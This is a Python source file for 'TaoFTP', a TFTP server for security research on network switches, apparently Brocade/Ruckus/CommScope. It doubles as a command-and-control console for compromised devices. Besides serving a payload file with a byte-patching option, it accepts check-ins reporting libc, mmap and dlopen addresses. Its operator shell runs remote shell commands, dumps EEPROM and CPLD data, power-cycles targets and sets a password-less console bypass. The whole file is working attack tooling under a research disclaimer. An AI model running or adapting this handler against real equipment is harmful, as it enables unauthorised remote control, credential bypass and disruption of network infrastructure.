#!/usr/bin/env python3
# Copyright (C) 2025 ff794e44ea1c2b5211a3b07c57b5a3813f87f53ac10d78e56b16b79db6ff9615
#                    b726ae7cf45cc4dfa8de359caffb893209bca614d9387a7666b106052fba3e50
#
# This program is free software: you can redistribute it and/or modify it
# under the terms of the GNU General Public License as published by the Free
# Software Foundation, either version 3 of the License, or (at your option)
# any later version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along with
# this program. If not, see <https://www.gnu.org/licenses/>.
#
# DMCA Security Research Exemption:
# Good faith security research conducted consistent with 17 U.S.C. ยง1201(j) and
# 37 CFR ยง201.40(b)(7) is explicitly permitted.
#
# This software is intended solely for educational, forensic, and lawful
# security research purposes. Any use of this software for offensive or harmful
# purposes is expressly prohibited.
#
# DISCLAIMER:
# The author disclaims any responsibility or liability for any direct, indirect,
# incidental, or consequential damages or losses resulting from the use or
# misuse of this software. Users bear full responsibility for compliance with
# applicable laws and regulations.
#
# Use, modification, or distribution constitutes explicit agreement to all terms
# above.

import argparse
import os
import socket
import struct
import threading
import queue
import time
from pwn import log
import readline
import shlex

class SimpleTelnet:
    def __init__(self, host, port=23, timeout=10):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock = None

    def open(self):
        """Establish a connection to the remote Telnet server."""
        self.sock = socket.create_connection((self.host, self.port), self.timeout)
        # self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

    def read_until(self, expected, timeout=None):
        """
        Read from the socket until the expected bytes are encountered or timeout.
        Returns the data read.
        """
        if timeout is None:
            timeout = self.timeout
        self.sock.settimeout(timeout)
        data = b""
        if not isinstance(expected, bytes):
            expected = expected.encode("ascii")
        while expected not in data:
            try:
                chunk = self.sock.recv(4096)
                if not chunk:
                    # Remote end closed connection.
                    break
                data += chunk
            except socket.timeout:
                break
        return data

    def write(self, data):
        """Send data to the remote server. Accepts str or bytes."""
        if isinstance(data, str):
            data = data.encode("ascii")
        self.sock.sendall(data)

    def close(self):
        """Close the connection."""
        if self.sock:
            self.sock.close()
            self.sock = None

class TaoFTPSession:
    def __init__(self, session_id, client_addr):
        self.session_id = session_id
        self.client_addr = client_addr
        self.response = None  # Will hold a tuple: (command_code, response_payload)
        self.event = threading.Event()
        self.data = {}

    def set_data(self, data):
        self.data.update(data)

class TaoFTP:
    # TFTP opcodes
    TFTP_RRQ       = 1    # Read Request
    TFTP_DATA      = 3    # Data packet
    TFTP_ACK       = 4    # Acknowledgment
    MAGIC_OPCODE   = 13   # Magic opcode for "special requests"

    # HEARTBEAT and MAGIC constants for magic packets
    HEARTBEAT_CONFIG    = 0x10
    HEARTBEAT_EXEC      = 0x11
    HEARTBEAT_DUMP      = 0x12
    HEARTBEAT_POWERCYCLE = 0x13
    HEARTBEAT_EXIT      = 0x17
    HEARTBEAT_NOOP      = 0x18

    MAGIC_ACK           = 0x20

    def __init__(self, file_to_serve, host="0.0.0.0", port=6969, msg_queue=None, noop_interval=60):
        """
        Initialize the TaoFTP server.
        """
        self.file_to_serve = file_to_serve
        self.host = host
        self.port = port
        self.msg_queue = msg_queue
        self.running = False
        self._server_socket = None
        self.placeholder_marker = None
        self.placeholder_size = None

        # For handling persistent magic request sessions.
        self.pending_sessions = {}   # session_id -> TaoFTPSession
        self.pending_lock = threading.Lock()
        self.next_session_id = 1
        self.device_data_callback = None
        self.noop_interval = noop_interval

        self._load_file()

    def _load_file(self):
        """Load the file to be served."""
        try:
            with open(self.file_to_serve, "rb") as f:
                self.file_data = f.read()
        except Exception as e:
            log.error(f"Error reading file '{self.file_to_serve}': {e}")
            raise ValueError(f"Error reading file '{self.file_to_serve}': {e}")

    def set_device_data_callback(self, cb):
        self.device_data_callback = cb

    def start(self):
        """
        Start the TaoFTP server.
        This method binds the UDP socket and begins listening for incoming packets.
        """
        try:
            self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._server_socket.bind((self.host, self.port))
            log.info(f"TaoFTP server started on {self.host}:{self.port} serving file: {self.file_to_serve}")
        except Exception as e:
            log.error(f"Failed to bind TaoFTP server on {self.host}:{self.port}: {e}")
            raise RuntimeError(f"Failed to bind TaoFTP server on {self.host}:{self.port}: {e}")

        self.running = True
        self._serve_forever()

    def stop(self):
        """Stop the TaoFTP server."""
        self.running = False
        if self._server_socket:
            self._server_socket.close()
            self._server_socket = None
        log.info("TaoFTP server stopped.")

    def _serve_forever(self):
        """Continuously listen for incoming UDP packets and process them."""
        while self.running:
            try:
                data, client_addr = self._server_socket.recvfrom(1024)
            except Exception as e:
                log.error(f"Error receiving data: {e}")
                continue
            self.process_packet(data, client_addr)

    def process_packet(self, data, client_addr):
        """
        Process an incoming UDP packet.
        If the opcode is RRQ (1), handle with handle_tftp_transfer.
        If the opcode is magic (13), handle with handle_tftp_magic.
        """
        try:
            opcode = struct.unpack("!H", data[0:2])[0]
        except Exception as e:
            log.error(f"Failed to unpack opcode from packet from {client_addr}: {e}")
            return

        if opcode == self.TFTP_RRQ:
            log.info(f"TaoFTP: RRQ received from {client_addr}")
            threading.Thread(target=self.handle_tftp_transfer, args=(client_addr, data), daemon=True).start()
            return True
        elif opcode == self.MAGIC_OPCODE:
            if len(data) < 3:
                log.warn(f"Received truncated TFTP MAGIC opcode from {client_addr}")
                return False

            xtra_magic = struct.unpack('!Hc', data[0:3])
            if xtra_magic[0] == 13 and xtra_magic[1] == b"%":
                log.info(f"TaoFTP: Magic request received from {client_addr}")
                threading.Thread(target=self.handle_tftp_magic, args=(client_addr, data), daemon=True).start()
                return True
            else:
                log.warn(f"Received malformed TFTP MAGIC from {client_addr}")
                return False
        else:
            log.warn(f"Received unsupported TFTP opcode {opcode} from {client_addr}")

    def handle_tftp_transfer(self, client_addr, data):
        """
        Handle a single TFTP RRQ request using a new UDP socket.
        The file is split into 512-byte blocks and sent to the client, which must ACK each block.
        """
        transfer_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        transfer_socket.settimeout(5)
        block = 1
        offset = 0
        total_size = len(self.file_data)

        prog = log.progress(f"XFER to {client_addr}")
        prog.status(f"sending {total_size} bytes to {client_addr}")

        while True:
            chunk = self.file_data[offset:offset + 512]
            data_packet = struct.pack("!HH", self.TFTP_DATA, block) + chunk
            try:
                transfer_socket.sendto(data_packet, client_addr)
            except Exception as e:
                log.error(f"Error sending data block {block} to {client_addr}: {e}")
                break

            try:
                ack_packet, _ = transfer_socket.recvfrom(1024)
                ack_opcode, ack_block = struct.unpack("!HH", ack_packet[:4])
                if ack_opcode != self.TFTP_ACK or ack_block != block:
                    log.error(f"Unexpected ACK from {client_addr}: opcode={ack_opcode} block={ack_block}")
                    break
            except socket.timeout:
                log.error(f"Timeout waiting for ACK for block {block} from {client_addr}")
                break

            if len(chunk) < 512:
                break

            block += 1
            offset += 512
            progress_percent = min(100, int((offset / total_size) * 100))
            prog.status(f"Sent block {block} ({progress_percent}%)")

        prog.success("Complete")

        if self.msg_queue:
            self.msg_queue.put(("completed", client_addr, None))

        transfer_socket.close()

    def handle_tftp_magic(self, client_addr, request_data):
        """
        Handle a TFTP magic request.
        """
        magic_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        magic_socket.settimeout(10)

        magic_body = request_data[3:]

        client_data = {}

        if len(magic_body) >= 16:
            pid, ppid, uid, euid = struct.unpack("!IIII", magic_body[0:16])
            log.success(f"Remote process: pid {pid}, parent {ppid}, uid {uid}, euid {euid}")

            if len(magic_body) > 16:
                xtra_body = magic_body[16:]
                if len(xtra_body) > 0:
                    subopcode = struct.unpack("!B", xtra_body[0:1])[0]
                    log.debug(f"Additional opcode: {subopcode} ({len(xtra_body)} extra bytes)")

                    if subopcode == 1 and len(xtra_body) > 12:
                        addrs = struct.unpack("!III", xtra_body[1:13])

                        log.info(f" -> libc:{addrs[0]:08x}")
                        log.info(f" -> mmap:{addrs[1]:08x} dlopen:{addrs[2]:08x}")

                        client_data['libc_base'] = addrs[0]
                        client_data['mmap'] = addrs[1]
                        client_data['dlopen'] = addrs[2]

        # Register this magic request as a persistent session.
        with self.pending_lock:
            session_id = self.next_session_id
            self.next_session_id += 1
            pending = TaoFTPSession(session_id, client_addr)
            pending.set_data(client_data)
            self.pending_sessions[session_id] = pending

        log.success(f"Magic request from {client_addr}: persistent session opened with ID {session_id}.")
        if self.msg_queue:
            self.msg_queue.put(("new_session", client_addr, session_id))

        last_noop_ack = time.time()

        # Persistent session loop: keep waiting for interactive responses until HEARTBEAT_EXIT.
        while True:
            # Wait for interactive response for up to self.noop_interval seconds.
            event_received = pending.event.wait(timeout=self.noop_interval)

            if not event_received:
                # No interactive command was provided within the interval.
                # Send a HEARTBEAT_NOOP packet to reset the timer.
                noop_packet = struct.pack("!HH", 1337, self.HEARTBEAT_NOOP)
                try:
                    magic_socket.sendto(noop_packet, client_addr)
                except Exception as e:
                    log.error(f"Error sending HEARTBEAT_NOOP to {client_addr}: {e}")
                    continue

                try:
                    # Wait briefly for the NOOP ACK.
                    noop_ack_pkt, _ = magic_socket.recvfrom(1024)
                    if len(noop_ack_pkt) < struct.calcsize("!BB"):
                        log.warn(f"Truncated NOOP ACK from {client_addr}")
                    else:
                        magic_ack, acked_opcode = struct.unpack("!BB", noop_ack_pkt[0:2])
                        if magic_ack == self.MAGIC_ACK and acked_opcode == self.HEARTBEAT_NOOP:
                            last_noop_ack = time.time()
                            log.debug(f"Received HEARTBEAT_NOOP ACK from {client_addr}")
                except socket.timeout:
                    log.warn(f"Timeout waiting for HEARTBEAT_NOOP ACK from {client_addr}")
                    break  # Terminate session if remote side is unresponsive.

                # Keep processing queue
                continue

            if pending.response:
                command_code, response_payload = pending.response
                # Clear response for the next iteration.
                pending.response = None
                pending.event.clear()

                response_packet = struct.pack("!HH", 1337, command_code) + response_payload
                try:
                    magic_socket.sendto(response_packet, client_addr)
                except Exception as e:
                    log.warn(f"Error sending data to {client_addr}: {e}")
                    continue

                log.debug(f"Sent response for session {session_id} with command {hex(command_code)}")

                # If the command is HEARTBEAT_EXIT, end the persistent session.
                if command_code == self.HEARTBEAT_EXIT:
                    log.info(f"HEARTBEAT_EXIT received for session {session_id}, terminating persistent session.")
                    break

                try:
                    magic_ack_pkt, _ = magic_socket.recvfrom(4096)
                    if len(magic_ack_pkt) < struct.calcsize("!BB"):
                        log.warn(f"Truncated ACK from {client_addr}")
                        continue

                    magic_ack, acked_opcode = struct.unpack("!BB", magic_ack_pkt[0:2])
                    if magic_ack != self.MAGIC_ACK or acked_opcode != command_code:
                        log.warn(f"Unexpected ACK from {client_addr}: opcode={magic_ack:x} opcode={acked_opcode:x}")
                        log.hexdump(magic_body)
                        continue

                    log.success(f"MAGIC ACK for op {command_code} with {len(magic_ack_pkt)} bytes.")
                    self.handle_magic_ack(session_id, magic_socket, client_addr, acked_opcode, magic_ack_pkt[2:])
                except socket.timeout:
                    log.warn(f"Timeout waiting for ACK from {client_addr}")
                    break

        # End of persistent session.
        with self.pending_lock:
            if session_id in self.pending_sessions:
                del self.pending_sessions[session_id]
                self.msg_queue.put(("session_ended", client_addr, session_id))

        magic_socket.close()

    def handle_magic_ack(self, session_id: int, magic_socket: socket.socket, client_addr, op: int, body: bytes):
        """
        Handle MAGIC_ACK response data.
        """
        if op == self.HEARTBEAT_EXEC:
            if len(body) < 2:
                log.warn(f"Exec ACK pkt from {client_addr} is too short.")
                return

            seq = body[0]
            is_final = body[1]
            output = bytearray()
            output.extend(body[2:])
            log.info(f"Received exec ACK pkt: seq {seq}, final_flag {is_final}, payload {len(body)-2} bytes.")

            while is_final == 0:
                try:
                    next_pkt, _ = magic_socket.recvfrom(4096)
                except socket.timeout:
                    log.warn(f"Timeout waiting for exec ACK continuation from {client_addr}.")
                    break
                if len(next_pkt) < 4:
                    log.warn(f"Truncated exec ACK packet from {client_addr}.")
                    break

                next_seq = next_pkt[2]
                is_final = next_pkt[3]
                payload = next_pkt[4:]
                output.extend(payload)

                log.debug(f"Received exec cont. pkt: seq {next_seq}, final {is_final}, payload {len(payload)} bytes.")

            if is_final < 2:
                exec_output = output.decode(errors='ignore')
                log.success(f"Command executed in remote ({client_addr}):")
                log.indented(exec_output)
            else:
                if is_final == 2:
                    log.warn(f"remote {client_addr} popen() failed!")
                else:
                    _, errcode, errno = struct.unpack("!5sII", output[0:13])
                    if errcode == 32512:
                        log.warn(f"Executable does not exist?")
                    else:
                        log.warn(f"Command failed in remote ({client_addr}), returned {errcode} (errno {errno})")
                        log.hexdump(output)

        elif op == self.HEARTBEAT_POWERCYCLE:
            log.success(f"Target is powercycling ({client_addr})")
        elif op == self.HEARTBEAT_DUMP:
            device_id, ret_code = struct.unpack("!BI", body[0:5])
            if ret_code == 0:
                log.success(f"Target's device {device_id} dumped ({client_addr}):")
                device_data = body[5:]
                if self.device_data_callback:
                    self.device_data_callback(session_id, device_id, device_data, client_addr)
                else:
                    log.hexdump(device_data)
            else:
                log.warn(f"Target's device {device_id} failed to dump ({client_addr}) with error {ret_code}!")

    def pack_configuration(self, version : int, flags : int, ips : list, extra_buf : bytes):
        if len(ips) != 4:
            raise ValueError("Exactly four IP addresses must be provided")

        ip_bytes = b"".join(socket.inet_aton(ip) for ip in ips)
        header = struct.pack("!IBI", 0xf986a2b1, version, flags)
        return header + ip_bytes + extra_buf

    def send_response_packet(self, client_addr, packet):
        """
        Helper function to send a packet via a new UDP socket.
        """
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.sendto(packet, client_addr)
            log.debug(f"Sent response packet to {client_addr}")
        except Exception as e:
            log.error(f"Error sending packet to {client_addr}: {e}")
        finally:
            s.close()

    def send_magic_op(self, session_id: int, op: int, data: bytes):
        with self.pending_lock:
            if session_id in self.pending_sessions:
                self.pending_sessions[session_id].response = (op, data)
                self.pending_sessions[session_id].event.set()
                log.debug(f"Sent MAGIC command {op} to session {session_id}.")
                return True
            else:
                return False

    def send_magic_powercycle(self, session_id) -> bool:
        return self.send_magic_op(session_id, self.HEARTBEAT_POWERCYCLE, b"\x00")

    def send_magic_nopasswd(self, session_id) -> bool:
        return self.send_magic_op(session_id, self.HEARTBEAT_CONFIG, b"\x00")

    def send_magic_dump(self, session_id : int, device_id : int) -> bool:
        payload = struct.pack("!B", device_id)
        return self.send_magic_op(session_id, self.HEARTBEAT_DUMP, payload)

    def send_magic_exec(self, session_id: int, command_str: str) -> bool:
        cmd_bytes = command_str.encode() + b'\x00'
        payload = cmd_bytes.ljust(512, b"\x00")
        return self.send_magic_op(session_id, self.HEARTBEAT_EXEC, payload)

    def send_magic_exit(self, session_id: int) -> bool:
        """
        Send a HEARTBEAT_EXIT command to terminate a persistent session.
        """
        return self.send_magic_op(session_id, self.HEARTBEAT_EXIT, b"")

    def set_marker(self, marker: bytes, length: int) -> bool:
        self.placeholder_marker = marker
        self.placeholder_size = length

    def patch_marker(self, patch: bytes, pad_random: bool = False, marker: bytes = None) -> bool:
        """
        Find the marker in the file data and replace it with the patch.
        If the patch is shorter than the marker, it is padded either with random bytes
        (if pad_random is True) or with zeros.
        """
        if self.placeholder_size is None:
            log.error("Placeholder size not set!")
            return False

        if marker is None and self.placeholder_marker is None:
            log.error("Marker not set!")
            return False
        else:
            if marker is None and self.placeholder_marker:
                marker = self.placeholder_marker

        idx = self.file_data.find(marker)
        if idx == -1:
            log.error("Marker not found in file data.")
            return False

        # Advance past the marker (leave it intact)
        idx += len(marker)

        if len(patch) > self.placeholder_size - len(marker):
            log.error("Patch length provided exceeds placeholder size!")
            return False

        # Pad patch if it's shorter than the marker length.
        if len(patch) < self.placeholder_size - len(marker):
            missing = self.placeholder_size - len(marker) - len(patch)
            patch += os.urandom(missing) if pad_random else b'\x00' * missing

        # Replace the marker region with the patch.
        self.file_data = self.file_data[:idx] + patch + self.file_data[idx + (self.placeholder_size - len(marker)):]
        log.info(f"Patched data ({len(patch)} bytes) into offset {idx}")
        return True

def taoftp_shell_handler(server : TaoFTP, msg_queue):
    # Thread to poll msg_queue (if needed)
    def poll_messages():
        while True:
            try:
                message = msg_queue.get(timeout=1)
                log.debug(f"[QUEUE] {message}")
            except queue.Empty:
                continue

    msg_thread = threading.Thread(target=poll_messages, daemon=True)
    msg_thread.start()

    selected_session = None

    # Autocomplete for interactive shell commands.
    COMMANDS = ['select', 'powercycle', 'shell', 'dump',
                'nopasswd', 'exit_session', 'help', 'exit', 'quit']

    def print_help():
        help_text = """
Supported commands:
  select [session_id]         - Select a magic session.
  powercycle                  - Powercycle target.
  shell [command ...]         - Execute command (with arguments).
  dump [device]               - Dump target's: EEPROM (0), system CPLD (1).
  nopasswd                    - Set bypass for password-less console access.
  kill                        - Terminate the persistent session.
  help                        - Show this help message.
  killall                     - Terminate all sessions
  exit | quit                 - Stop the server and exit.
"""
        print(help_text)

    def completer(text, state):
        options = [cmd for cmd in COMMANDS if cmd.startswith(text)]
        try:
            return options[state]
        except IndexError:
            return None

    readline.parse_and_bind("tab: complete")
    readline.set_completer(completer)

    log.info("Starting TaoFTP interactive shell. Type 'help' for commands.")

    while True:
        try:
            if not selected_session:
                shell_prompt = f"TaoFTP > "
            else:
                shell_prompt = f"TaoFTP [{selected_session}]> "

            line = input(shell_prompt)
        except (EOFError, KeyboardInterrupt):
            log.warn("\nExiting interactive shell.")
            server.stop()
            break

        try:
            args_list = shlex.split(line)
        except Exception as e:
            print("Parsing error:", e)
            continue
        if not args_list:
            continue

        cmd = args_list[0].lower()

        if cmd in ("exit", "quit"):
            log.warn("Exiting interactive shell.")
            server.stop()
            break

        elif cmd == "help":
            print_help()

        elif cmd == "select":
            if len(args_list) != 2:
                log.info("Usage: select [session_id]")
                continue
            try:
                sess_id = int(args_list[1])
            except ValueError:
                log.warn("Session id must be an integer.")
                continue
            with server.pending_lock:
                if sess_id in server.pending_sessions:
                    selected_session = sess_id
                    log.info(f"Session {sess_id} selected.")
                else:
                    log.warn(f"Session {sess_id} not found.")

        elif cmd == "killall":
            for session in server.pending_sessions.keys():
                log.info(f"Terminating session {session}")
                server.send_magic_exit(session)

            selected_session = None

        elif cmd == "powercycle":
            if selected_session is None:
                log.info("No session selected. Use 'select [session_id]' first.")
                continue
            server.send_magic_powercycle(selected_session)
            selected_session = None

        elif cmd == "shell":
            if selected_session is None:
                log.info("No session selected. Use 'select [session_id]' first.")
                continue
            if len(args_list) < 2:
                log.info("Usage: shell [command ...]")
                continue
            command_str = " ".join(args_list[1:])
            if not server.send_magic_exec(selected_session, command_str):
                selected_session = None
                log.warn("Selected session no longer available.")

        elif cmd == "dump":
            if selected_session is None:
                log.info("No session selected. Use 'select [session_id]' first.")
                continue

            if len(args_list) != 2:
                log.warn("Usage: dump [device id: 0=EEPROM, 1=system CPLD]")
                continue

            device_id = 0
            try:
                device_id = int(args_list[1])
            except ValueError:
                log.warn("device id must be an integer.")
                continue

            if not server.send_magic_dump(selected_session, device_id):
                selected_session = None
                log.warn("Selected session no longer available.")

        elif cmd == "nopasswd":
            if selected_session is None:
                log.warn("No session selected. Use 'select [session_id]' first.")
                continue
            if not server.send_magic_nopasswd(selected_session):
                selected_session = None
                log.warn("Selected session no longer available.")

        elif cmd == "kill":
            if selected_session is None:
                log.warn("No session selected. Use 'select [session_id]' first.")
                continue

            if server.send_magic_exit(selected_session):
                log.info(f"Sent HEARTBEAT_EXIT command to session {selected_session}.")
                selected_session = None
            else:
                log.warn("Selected session no longer available.")

        else:
            log.warn("Unknown command. Type 'help' for supported commands.")

if __name__ == "__main__":
    import shlex
    import readline

    # Brocade/Ruckus/CommScope specific
    from internals import parse_cpld_registers, dump_cpld_info, extract_eeprom_info

    def device_data_callback(session_id : int,
                             device_id : int, device_data : bytes, client_addr):
        log.info(f"Got device data for {client_addr}")
        log.hexdump(device_data)

    parser = argparse.ArgumentParser(description="TaoFTP Server")
    parser.add_argument("--file", "-f", required=True, help="Path to the file to serve")
    parser.add_argument("--host", default="0.0.0.0", help="Host to bind the server (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=6969, help="Port to bind the server (default: 6969)")
    parser.add_argument("--patch-marker", help="Marker string to search for in file data (will be encoded to bytes)")
    parser.add_argument("--patch-data", help="Patch data to replace the marker (will be encoded to bytes)")
    parser.add_argument("--patch-length", type=int, default=16, help="Length of the patch (default: 16)")
    parser.add_argument("--pad-random", action="store_true", help="Pad patch with random bytes if patch data is short")
    args = parser.parse_args()

    msg_q = queue.Queue()
    server = TaoFTP(args.file, host=args.host, port=args.port, msg_queue=msg_q)

    if args.patch_marker and args.patch_data:
        marker = args.patch_marker.encode()
        patch_data = args.patch_data.encode()
        if server.patch_marker(patch_data, length=args.patch_length, pad_random=args.pad_random, marker=marker):
            log.info("File data patched successfully.")
        else:
            log.error("Failed to patch file data.")

    server.set_device_data_callback(device_data_callback)

    server_thread = threading.Thread(target=server.start, daemon=True)
    server_thread.start()

    taoftp_shell_handler(server, msg_q)
